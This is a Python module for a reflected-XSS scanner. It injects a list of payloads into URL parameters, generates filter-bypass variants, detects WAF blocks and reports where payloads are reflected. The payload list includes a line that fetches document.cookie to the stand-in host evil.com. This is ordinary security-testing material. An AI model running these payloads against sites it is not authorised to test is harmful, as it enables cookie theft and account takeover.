"""
XSS Scanner Module - Enhanced Reflected XSS Detection
This module provides advanced functions to detect reflected XSS vulnerabilities.
"""

import re
import html
import random
import string
import requests
from typing import Dict, List, Any, Tuple, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import bs4
from bs4 import BeautifulSoup

# List of XSS payloads for testing
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", 
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<script>document.cookie</script>",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "<img src=\"x\" onerror=\"alert(document.domain)\">",
    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
    "<div style=\"background-image: url(javascript:alert(1))\">",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "<a onmouseover=\"alert(1)\">hover me</a>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
]

# Test cases that indicate successful XSS exploitation
XSS_INDICATORS = [
    "<script>",
    "javascript:",
    "onerror=",
    "onload=",
    "onclick=",
    "onmouseover=",
    "onfocus=",
    "onmouseout=",
    "onkeypress=",
    "onsubmit=",
    "ontoggle=",
    "alert(",
    "String.fromCharCode",
    "eval(",
    "document.cookie",
    "fetch(",
]

def generate_unique_payload() -> Tuple[str, str]:
    """
    Generate a unique XSS payload with a random identifier to better track reflections
    
    Returns:
        Tuple containing the full payload and the unique identifier
    """
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    unique_marker = f"xss{random_id}"
    return f"<script>alert('{unique_marker}')</script>", unique_marker

def is_payload_reflected_exact(response: requests.Response, payload: str) -> bool:
    """
    Check if a payload is reflected exactly as-is in the response
    
    Args:
        response: HTTP response object
        payload: XSS payload that was injected
        
    Returns:
        True if the payload is reflected without modification, False otherwise
    """
    return payload in response.text

def is_payload_reflected_encoded(response: requests.Response, payload: str) -> bool:
    """
    Check if a payload is reflected after HTML encoding
    
    Args:
        response: HTTP response object
        payload: XSS payload that was injected
        
    Returns:
        True if the encoded payload is found, False otherwise
    """
    encoded_payload = html.escape(payload)
    return encoded_payload in response.text and payload not in response.text

def detect_context(response: requests.Response, marker: str) -> List[str]:
    """
    Detect the context in which a marker appears in HTML
    
    Args:
        response: HTTP response object
        marker: Unique identifier to locate in the response
        
    Returns:
        List of contexts in which the marker was found
    """
    contexts = []
    if marker not in response.text:
        return contexts
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Check for script context
    scripts = soup.find_all('script')
    for script in scripts:
        if script.string and marker in script.string:
            contexts.append('script')
            break
    
    # Check for attribute context
    for tag in soup.find_all(True):
        for attr_name, attr_value in tag.attrs.items():
            if isinstance(attr_value, str) and marker in attr_value:
                contexts.append(f'attribute:{attr_name}')
    
    # Check for HTML context
    if marker in str(soup):
        contexts.append('html')
    
    # Check for URL context
    if f"href=\"{marker}\"" in response.text or f"src=\"{marker}\"" in response.text:
        contexts.append('url')
    
    return contexts

def check_for_waf_block(response: requests.Response) -> bool:
    """
    Check if the response indicates a Web Application Firewall block
    
    Args:
        response: HTTP response object
        
    Returns:
        True if WAF block is detected, False otherwise
    """
    waf_indicators = [
        "security block",
        "blocked for security reasons",
        "attack detected",
        "firewall",
        "WAF",
        "mod_security",
        "forbidden",
        "suspicious activity",
        "malicious request",
    ]
    
    for indicator in waf_indicators:
        if indicator.lower() in response.text.lower():
            return True
    
    # Check for common WAF response codes
    if response.status_code in [403, 406, 429, 501]:
        return True
    
    return False

def bypass_simple_filters(payload: str) -> List[str]:
    """
    Generate bypass variants of a payload to evade simple filters
    
    Args:
        payload: Original XSS payload
        
    Returns:
        List of bypass payload variants
    """
    bypass_variants = []
    
    # Case variation
    if "<script>" in payload.lower():
        bypass_variants.append(payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"))
    
    # Entity encoding
    if "<" in payload:
        bypass_variants.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
    
    # URL encoding
    bypass_variants.append(payload.replace("<", "%3C").replace(">", "%3E"))
    
    # Double encoding
    bypass_variants.append(payload.replace("<", "%253C").replace(">", "%253E"))
    
    # Null byte
    bypass_variants.append(payload.replace("<script>", "<script\x00>"))
    
    # Spaces to comments
    if "<script>" in payload.lower():
        bypass_variants.append(payload.replace("<script>", "<script/**//>"))
    
    return bypass_variants

def extract_input_fields(html_content: str) -> List[Dict[str, str]]:
    """
    Extract all input fields from an HTML page
    
    Args:
        html_content: HTML content of the page
        
    Returns:
        List of dictionaries containing input field details
    """
    inputs = []
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Find all input elements
    for input_tag in soup.find_all('input'):
        input_data = {
            'name': input_tag.get('name', ''),
            'type': input_tag.get('type', 'text'),
            'value': input_tag.get('value', ''),
            'id': input_tag.get('id', ''),
            'required': input_tag.get('required') is not None
        }
        
        # Only include inputs with a name attribute that are not hidden or submit
        if input_data['name'] and input_data['type'] not in ['hidden', 'submit', 'button']:
            inputs.append(input_data)
    
    # Find all textarea elements
    for textarea in soup.find_all('textarea'):
        input_data = {
            'name': textarea.get('name', ''),
            'type': 'textarea',
            'value': textarea.string or '',
            'id': textarea.get('id', ''),
            'required': textarea.get('required') is not None
        }
        
        if input_data['name']:
            inputs.append(input_data)
    
    # Find all select elements
    for select in soup.find_all('select'):
        input_data = {
            'name': select.get('name', ''),
            'type': 'select',
            'value': '',
            'id': select.get('id', ''),
            'required': select.get('required') is not None
        }
        
        # Get the selected option as the default value
        selected_option = select.find('option', selected=True)
        if selected_option:
            input_data['value'] = selected_option.get('value', '')
        
        if input_data['name']:
            inputs.append(input_data)
    
    return inputs

def scan_url_parameters(url: str, session: requests.Session) -> List[Dict[str, Any]]:
    """
    Scan URL parameters for XSS vulnerabilities
    
    Args:
        url: URL to scan
        session: HTTP session object
        
    Returns:
        List of detected XSS vulnerabilities
    """
    vulnerabilities = []
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    # If no query parameters, return empty list
    if not query_params:
        return vulnerabilities
    
    for param_name, param_values in query_params.items():
        original_value = param_values[0]
        
        # Test multiple payloads
        for payload in XSS_PAYLOADS:
            # Create a copy of the original query parameters
            modified_params = parse_qs(parsed_url.query)
            
            # Replace the target parameter with the XSS payload
            modified_params[param_name] = [payload]
            
            # Rebuild the URL with the modified query
            new_query = urlencode(modified_params, doseq=True)
            new_url_parts = list(parsed_url)
            new_url_parts[4] = new_query
            new_url = urlunparse(new_url_parts)
            
            try:
                # Send request with the modified URL
                response = session.get(new_url, allow_redirects=True)
                
                # Check if the payload is reflected in the response
                if is_payload_reflected_exact(response, payload):
                    contexts = detect_context(response, payload)
                    
                    vulnerability = {
                        'url': new_url,
                        'parameter': param_name,
                        'payload': payload,
                        'reflection_type': 'exact',
                        'contexts': contexts,
                        'waf_detected': check_for_waf_block(response)
                    }
                    
                    vulnerabilities.append(vulnerability)
                    # No need to test more payloads for this parameter
                    break
                
                # Generate a unique payload
                unique_payload, marker = generate_unique_payload()
                
                # Test with unique payload
                modified_params[param_name] = [unique_payload]
                new_query = urlencode(modified_params, doseq=True)
                new_url_parts[4] = new_query
                unique_url = urlunparse(new_url_parts)
                
                unique_response = session.get(unique_url, allow_redirects=True)
                
                # Check if the unique marker is reflected
                if marker in unique_response.text:
                    contexts = detect_context(unique_response, marker)
                    
                    vulnerability = {
                        'url': unique_url,
                        'parameter': param_name,
                        'payload': unique_payload,
                        'reflection_type': 'marker',
                        'contexts': contexts,
                        'waf_detected': check_for_waf_block(unique_response)
                    }
                    
                    vulnerabilities.append(vulnerability)
                    break
                
            except Exception as e:
                print(f"Error scanning URL parameter {param_name}: {str(e)}")
    
    return vulnerabilities

def analyze_xss_vulnerability(vulnerability: Dict[str, Any]) -> Dict[str, Any]:
    """
    Analyze an XSS vulnerability and provide detailed information
    
    Args:
        vulnerability: Dictionary containing vulnerability details
        
    Returns:
        Enhanced vulnerability information
    """
    details = {
        'description': 'Cross-site scripting (XSS) vulnerability detected',
        'severity': 'High',
        'recommendation': 'Implement proper output encoding and input validation',
        'type': 'reflected_xss',
        'parameter': vulnerability.get('parameter', ''),
        'payload': vulnerability.get('payload', ''),
        'reflection_type': vulnerability.get('reflection_type', ''),
        'contexts': vulnerability.get('contexts', []),
        'consequences': 'Attackers can inject malicious JavaScript that executes in users\' browsers, allowing them to steal cookies and session tokens, capture keystrokes, redirect users to fake websites, or perform actions on behalf of the victim. This could lead to account takeover, data theft, or spreading malware to your users.'
    }
    
    # Adjust severity based on context
    if 'script' in vulnerability.get('contexts', []):
        details['severity'] = 'Critical'
        details['description'] = 'Critical XSS vulnerability - Direct script execution possible'
    
    # Add WAF detection information
    if vulnerability.get('waf_detected', False):
        details['notes'] = 'Web Application Firewall detected but not preventing the XSS attack'
    
    return details

def is_vulnerable_to_xss_advanced(response: requests.Response, payload: str) -> bool:
    """
    Advanced check for XSS vulnerability in response
    
    Args:
        response: HTTP response object
        payload: XSS payload that was injected
        
    Returns:
        True if vulnerable, False otherwise
    """
    # Check for exact payload reflection
    if payload in response.text:
        # If payload contains script tags or event handlers, check they're not encoded
        for indicator in XSS_INDICATORS:
            if indicator in payload and indicator in response.text:
                # Check it's not inside a textarea, code or pre block
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Remove all textarea, code and pre elements
                for tag in soup.find_all(['textarea', 'code', 'pre']):
                    tag.decompose()
                
                # Check if payload exists in remaining HTML
                cleaned_html = str(soup)
                if indicator in cleaned_html:
                    return True
    
    return False

def get_xss_details(response: requests.Response, payload: str, parameter: str = None) -> Dict[str, Any]:
    """
    Get detailed information about an XSS vulnerability
    
    Args:
        response: HTTP response object
        payload: XSS payload that was injected
        parameter: Parameter name if applicable
        
    Returns:
        Dictionary with vulnerability details
    """
    details = {
        'description': 'Cross-site scripting (XSS) vulnerability detected',
        'severity': 'High',
        'recommendation': 'Implement proper output encoding and input validation',
        'payload': payload,
        'consequences': 'Attackers can inject malicious JavaScript that executes in users\' browsers, allowing them to steal cookies and session tokens, capture keystrokes, redirect users to fake websites, or perform actions on behalf of the victim. This could lead to account takeover, data theft, or spreading malware to your users.'
    }
    
    if parameter:
        details['parameter'] = parameter
    
    # Determine the type of XSS based on payload
    if "<script>" in payload.lower():
        details['xss_type'] = 'script tag'
    elif "onerror" in payload.lower() or "onload" in payload.lower():
        details['xss_type'] = 'event handler'
    elif "javascript:" in payload.lower():
        details['xss_type'] = 'javascript URI'
    else:
        details['xss_type'] = 'other'
    
    return details
